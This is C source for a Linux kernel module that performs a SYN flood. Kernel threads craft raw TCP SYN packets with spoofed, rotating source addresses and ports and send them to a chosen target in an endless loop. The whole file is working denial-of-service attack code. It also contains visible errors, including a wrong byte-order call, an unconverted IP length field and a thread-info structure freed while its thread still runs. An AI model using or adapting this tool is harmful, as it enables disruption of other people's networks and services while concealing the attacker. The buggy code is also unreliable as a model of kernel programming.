#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <asm/uaccess.h>

#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/tcp.h>

#include "sf_main.h"
#include "sf_cdev.h"

MODULE_LICENSE("Dual BSD/GPL");

#define SEND_THREAD_MAX_NUM	10

synflood_thread_info *syn_send_thread[SEND_THREAD_MAX_NUM] = {};

static int synflood_thead_handler(void *arg);

int synflood_register_send_thread(synflood_thread_info *iput_th_info)
{
	synflood_thread_info *th_info = NULL;

	if (iput_th_info->sti_th_num >= SEND_THREAD_MAX_NUM){
		printk("Thread number %d is bigger than max number %d!\n",iput_th_info->sti_th_num, SEND_THREAD_MAX_NUM);
		return -1;
	}

	if (syn_send_thread[iput_th_info->sti_th_num] != NULL){
		printk("Thread number %d has been registered!\n",iput_th_info->sti_th_num);
		return -1;
	}

	th_info = (synflood_thread_info *)kmalloc(sizeof(synflood_thread_info), GFP_ATOMIC);
	if (th_info == NULL){
		printk("Malloc thread info failed!\n");
		return -1;
	}

	syn_send_thread[iput_th_info->sti_th_num] = th_info;

	*th_info = *iput_th_info;
	kernel_thread(synflood_thead_handler, th_info, CLONE_FS | CLONE_FILES | SIGCHLD);

	return 0;
}

void synflood_unregister_send_thread(int thread_number)
{
	synflood_thread_info *th_info = NULL;

	if (thread_number >= SEND_THREAD_MAX_NUM){
		printk("Thread number %d is bigger than max number %d!\n",thread_number, SEND_THREAD_MAX_NUM);
		return;
	}

	th_info = syn_send_thread[thread_number];
	if (th_info == NULL){
		printk("Thread number %d has not been registered!\n",thread_number);
		return;
	}

	syn_send_thread[thread_number] = NULL;
	kfree(th_info);
}

static void synflood_make_skb(synflood_thread_info *th_info, struct sk_buff *skb, int len)
{
	u8 *data = skb_put(skb, len);
	struct ethhdr *eth = (struct ethhdr *)data;
	struct iphdr *iph = (struct iphdr *)(eth + 1);
	struct tcphdr *th = (struct tcphdr *)(iph + 1);

	memset(data, 0, len);
	/*
	 * Start make TCP segment
	 */
	th->source		= th_info->sti_sport;
	th->dest		= th_info->sti_dport;
	th->window	= htons(65535U);
	 *(((u16 *)th) + 6)   = htons((sizeof(struct tcphdr) >> 2) << 12); 
	th->syn = 1;
	th->check = tcp_v4_check(sizeof(*th), th_info->sti_saddr, th_info->sti_daddr,
			csum_partial(th, th->doff << 2, skb->csum));
	/*
	 * End make TCP segment
	 */
	/*
	 * Start make IP segment
	 */
	*((__be16 *)iph) = htons((4 << 12) | (5 << 8));
	iph->ttl      = 0xFF;
	iph->protocol = IPPROTO_TCP;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->saddr    = th_info->sti_saddr;
	iph->daddr    = th_info->sti_daddr;
	
	iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

	eth->h_proto = skb->protocol;
	memset(eth->h_source, 0x01, ETH_ALEN); 
	memset(eth->h_dest, 0xFF, ETH_ALEN); 
}

static int synflood_send(synflood_thread_info *th_info)
{
	struct sk_buff *skb;
	struct net_device *dev;
	u16 proto = htons(ETH_P_IP);
	int len = ETH_HLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);

	dev = dev_get_by_name(&init_net, th_info->sti_if_name);
	if (dev == NULL){
		printk("Get dev failed!input name is %s\n",th_info->sti_if_name);
		goto out_unlock;
	}

	if (!(dev->flags & IFF_UP)){
		printk("Dev is not up!\n");
		goto out_unlock;
	}

	skb = alloc_skb(len + LL_RESERVED_SPACE(dev), GFP_KERNEL);

	/*
	 * If the write buffer is full, then tough. At this level the user
	 * gets to deal with the problem - do your own algorithmic backoffs.
	 * That's far more flexible.
	 */

	if (skb == NULL){
		printk("Skb alloc failed!\n");
		goto out_unlock;
	}

	/* FIXME: Save some space for broken drivers that write a
	 * hard header at transmission time by themselves. PPP is the
	 * notable one here. This should really be fixed at the driver level.
	 */
	skb_reserve(skb, LL_RESERVED_SPACE(dev));
	skb_reset_network_header(skb);
	skb->protocol = proto;
	skb->dev = dev;
//	skb->priority = sk->sk_priority;

#if 1
	/* Try to align data part correctly */
	if (dev->header_ops) {
		skb->data -= dev->hard_header_len;
		skb->tail -= dev->hard_header_len;
		if (len < dev->hard_header_len)
			skb_reset_network_header(skb);
	}
#endif
	synflood_make_skb(th_info, skb, len);
	/*
	 *	Now send it
	 */
	dev_queue_xmit(skb);
	dev_put(dev);
	return 0;

out_unlock:
	if (dev){
		dev_put(dev);
	}
	return -1;
}

static int synflood_thead_handler(void *arg)
{
	synflood_thread_info *th_info = (synflood_thread_info *)arg;
	u32 start_saddr = ntohl(th_info->sti_start_saddr);
	u32 end_saddr = ntohl(th_info->sti_end_saddr);
	u32 saddr = start_saddr;
	u16 start_sport = ntohs(th_info->sti_start_sport);
	u16 end_sport = ntohl(th_info->sti_end_sport);
	u16 sport = start_sport;
	
	while (1) {
		if (saddr > end_saddr){
			saddr = start_saddr;
		}
		if (htonl(saddr) == th_info->sti_daddr){
			saddr++;
		}
		if (sport > end_sport){
			sport = start_sport;
		}
		th_info->sti_saddr = htonl(saddr);
		th_info->sti_sport = htons(sport);
		synflood_send(th_info);
		saddr++;
		sport++;
	};

	return 0;
}

static int __init synflood_init(void)
{
	if (sf_cdev_init() < 0){
		printk("Cdev init failed!\n");
		return -1;
	}

	return 0;
}

static void __exit synflood_exit(void)
{
	int thread_num = 0;

	sf_cdev_exit();
	for (thread_num = 0; thread_num < SEND_THREAD_MAX_NUM; thread_num++){
		synflood_unregister_send_thread(thread_num);
	}
}

module_init(synflood_init);
module_exit(synflood_exit);
